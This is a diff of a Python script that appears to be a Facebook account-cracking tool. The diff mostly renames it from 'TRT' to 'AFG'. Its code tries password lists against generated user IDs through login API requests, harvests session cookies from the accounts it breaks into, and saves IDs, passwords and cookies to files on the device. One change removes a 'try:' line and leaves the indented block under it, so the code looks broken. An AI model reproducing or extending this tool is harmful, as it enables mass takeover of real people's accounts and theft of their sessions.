@@ -33,7 +33,6 @@ proxies=open('proxies.txt','r').read().splitlines()
 
 
 android_models=[]
-try:
 	xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()
 	for line in xx:
 		android_models.append(line)
@@ -166,7 +165,7 @@ logo=("""\033[1;91m
 \033[1;37m--------------------------------------------------
 [~] Author   : AFG BOY
 [~] Facebook : Mujeebullah Amini
-[~] Tool     : Paid
+[~] Tool     : Free
 [~] Version  : 1.0
 \033[1;37m----------------------------------------------""")
 def linex():
@@ -306,7 +305,7 @@ def menu():
 def pak():
 		user=[]
 		clear()
-		print('\033[1;35m Code example: 0306,0315,0335,0345')
+		print('\033[1;35m Code example: 9378,9379,9377,9370')
 		code = input('\033[1;37m put code: ')
 		try:
 			limit = int(input('\033[1;35m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
@@ -448,13 +447,13 @@ def gmail():
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python trt.py')
+		os.system('python AFG.py')
 #b-api method
 #1method
 def api1(ids,names,passlist):
 		try:
 			global ok,loop
-			sys.stdout.write('\r\r\033[1;37m [TRT-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write('\r\r\033[1;37m [AFG-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 			fn = names.split(' ')[0]
 			try:
 				ln = names.split(' ')[1]
@@ -544,7 +543,7 @@ def api1(ids,names,passlist):
 def api2(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [TRT-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [AFG-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -592,7 +591,7 @@ def api2(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [AFG-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
                                         open('/sdcard/AFG-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
@@ -694,7 +693,7 @@ def api3(ids,names,passlist):
                                         print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print("Cookie: "+coki)
-                                        open('/sdcard/TRT-COOKIE.txt','a').write(coki+'\n')
+                                        open('/sdcard/AFG-COOKIE.txt','a').write(coki+'\n')
                                         open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
